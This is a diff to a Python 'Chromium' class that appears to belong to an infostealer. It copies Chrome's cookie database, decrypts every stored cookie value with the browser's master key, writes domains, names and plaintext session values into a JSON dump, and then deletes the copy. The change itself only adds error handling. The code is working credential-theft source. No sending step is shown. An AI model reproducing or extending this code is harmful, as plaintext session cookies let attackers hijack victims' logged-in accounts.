@@ -284,10 +284,7 @@ class Chromium:
             #shutil.copy2(history_db, os.environ['USERPROFILE'] + 'C:\\windll\\Browsers\\Chrome\\cookies.db')
             c = connect(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
             cursor = c.cursor()
-        
-        
             results = '[\n'
-
             result = cursor.execute(CookiesSQL).fetchall()
 
             """
@@ -303,18 +300,32 @@ class Chromium:
                     http = False
                 else:
                     http = True
-                results += '''
-        {
-            "domain": "%s",
-            "expirationDate": %s,
-            "name": "%s",
-            "httpOnly": %s,
-            "path": "%s",
-            "secure": %s,
-            "value": "%s"
-        },
-                '''% (result[1], result[7], result[2], http, result[6], secure, self.decrypt(result[5], self.get_master_key_chromium(path)))
 
+                try:
+                    decrypted_value = str(self.decrypt(result[5], self.get_master_key_chromium(path)))
+                except Exception as error:
+                    decrypted_value = str(error)
+
+                results += '''
+                {
+                    "domain": "%s",
+                    "expirationDate": %s,
+                    "name": "%s",
+                    "httpOnly": %s,
+                    "path": "%s",
+                    "secure": %s,
+                    "value": "%s"
+                },
+                ''' % (
+                    str(result[1]),
+                    str(result[7]),
+                    str(result[2]),
+                    str(http),
+                    str(result[6]),
+                    str(secure),
+                    decrypted_value
+                )
+        
             results = results.replace('True', 'true')
             results = results.replace('False', 'false')
             results += '\n]'
@@ -324,8 +335,8 @@ class Chromium:
                 remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# clear all
             except:
                 pass
-        except:
-            pass
+        except Exception as error:
+            print(error)
     
 
     def get_master_key_chromium(self,pathl: str):
